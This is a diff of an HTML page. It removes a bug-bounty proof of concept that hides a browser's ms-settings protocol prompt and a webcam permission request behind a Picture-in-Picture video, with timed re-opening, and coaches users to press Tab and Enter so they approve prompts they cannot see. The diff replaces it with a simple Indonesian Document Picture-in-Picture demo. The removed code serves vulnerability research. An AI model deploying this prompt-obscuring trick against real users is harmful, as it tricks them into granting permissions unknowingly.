@@ -1,94 +1,84 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>PoC: PiP Obscuration for URI Scheme Prompts (Hypothetical Bypass Variant for VRP)</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document PiP Sederhana</title>
     <style>
-        html { font-family: sans-serif; }
-        #instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }
-        #wrapper {
-            position: absolute;
-            bottom: 0;
-            right: 0px;
+        body {
+            margin: 0;
+            height: 100vh;
+            background: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
         }
-        #uriTrigger { display: none; }
-        video { display: none; }
+        #content {
+            text-align: center;
+            padding: 20px;
+            background: white;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background: #28a745;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #218838;
+        }
     </style>
 </head>
 <body>
-    <h1>PoC: PiP Obscuration for URI Scheme Prompts (e.g., ms-settings) with Timing Bypass Attempt</h1>
-    <p>This variant attempts to obscure URI scheme prompts (e.g., ms-settings:bluetooth) using Video PiP, with rapid timing to potentially bypass delay protections. Integrated with webcam for permission test fallback. Test on Windows Chrome pre/post-fix.</p>
-    <p id="instructions">Click 'Start Test', then press Tab four times, then Enter three times (simulating bypass delay)</p>
-    
-    <!-- Webcam for Fallback Permission Test -->
-    <video id="webcamPlayer" autoplay playsinline></video>
-    <button id="startTestButton">Start Test (Trigger URI Prompt & PiP)</button>
-    
-    <!-- Hosted Video for PiP Obscuration -->
-    <video id="pipVideo" loop>
-        <source src="https://0x1337-exploit.github.io/hosting/staging/ado.mp4" type="video/mp4">
-    </video>
-    
-    <div id="wrapper">
-        <a id="uriTrigger" href="ms-settings:bluetooth">Trigger URI</a> <!-- Hidden URI trigger -->
+    <div id="content">
+        <h2>Konten Custom di DPiP</h2>
+        <p>Ini adalah teks HTML arbitrary. Bisa tambah gambar, link, dll.</p>
+        <img src="https://via.placeholder.com/150" alt="Gambar contoh" style="max-width: 100%;">
+        <button onclick="alert('Tombol di DPiP diklik!')">Tes Tombol</button>
     </div>
-    
+
+    <button onclick="openDPiP()">Buka Document PiP</button>
+
     <script>
-        const instructions = document.getElementById('instructions');
-        const startTestButton = document.getElementById('startTestButton');
-        const webcamVideo = document.getElementById('webcamPlayer');
-        const pipVideo = document.getElementById('pipVideo');
-        const uriTrigger = document.getElementById('uriTrigger');
-        let pipWindow;
-        let attemptCount = 0;
+        async function openDPiP() {
+            if (!('documentPictureInPicture' in window)) {
+                alert('Browser Anda tidak mendukung Document Picture-in-Picture.');
+                return;
+            }
 
-        // Start Test: Trigger URI, PiP, and Webcam as Fallback
-        startTestButton.addEventListener('click', async () => {
             try {
-                // Trigger URI scheme to show prompt (e.g., open Bluetooth settings)
-                uriTrigger.click(); // This will trigger the external protocol prompt
-                
-                // Immediately play video and request PiP to obscure
-                pipVideo.play();
-                await pipVideo.requestPictureInPicture();
-                
-                // Fallback: Request webcam permission (if URI fails, test camera)
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                webcamVideo.srcObject = stream;
-                
-                instructions.innerText = 'Press Tab four times, then Enter three times (First closes PiP, others approve hidden prompt)';
-                startTestButton.disabled = true;
-                
-                // Hypothetical timing bypass: Rapid PiP re-open after close
-                setTimeout(async () => {
-                    if (document.pictureInPictureElement && attemptCount < 2) {
-                        await document.exitPictureInPicture();
-                        await pipVideo.requestPictureInPicture();
-                        attemptCount++;
-                    }
-                }, 300); // Time to potentially hit before delay kicks in
-            } catch (error) {
-                alert('Failed: ' + error.message);
-            }
-        });
+                // Minta jendela DPiP
+                const pipWindow = await documentPictureInPicture.requestWindow({
+                    width: 400,  // Ukuran awal (bisa di-resize)
+                    height: 300
+                });
 
-        // Handle PiP events for re-obscuration
-        pipVideo.addEventListener('enterpictureinpicture', () => {
-            pipWindow = document.pictureInPictureElement;
-        });
-        pipVideo.addEventListener('leavepictureinpicture', () => {
-            pipWindow = null;
-            // Re-trigger PiP quickly
-            setTimeout(() => pipVideo.requestPictureInPicture(), 100);
-        });
+                // Pindahkan konten HTML ke jendela DPiP
+                const content = document.getElementById('content');
+                pipWindow.document.body.appendChild(content.cloneNode(true));
 
-        // Monitor camera permission as indicator (for fallback)
-        setInterval(async () => {
-            const permStatus = await navigator.permissions.query({ name: 'camera' });
-            if (permStatus.state === 'granted') {
-                instructions.innerText = 'Access granted! (Check if URI also triggered)';
+                // Tambah styling khusus untuk DPiP jika perlu
+                const style = pipWindow.document.createElement('style');
+                style.textContent = `
+                    body { background: #fff; padding: 10px; }
+                    :picture-in-picture { border: 2px solid blue; }  // Styling saat di PiP
+                `;
+                pipWindow.document.head.appendChild(style);
+
+                // Event saat jendela ditutup
+                pipWindow.addEventListener('unload', () => {
+                    console.log('DPiP ditutup');
+                });
+            } catch (err) {
+                alert('Gagal membuka DPiP: ' + err.message);
             }
-        }, 500);
+        }
     </script>
 </body>
 </html>
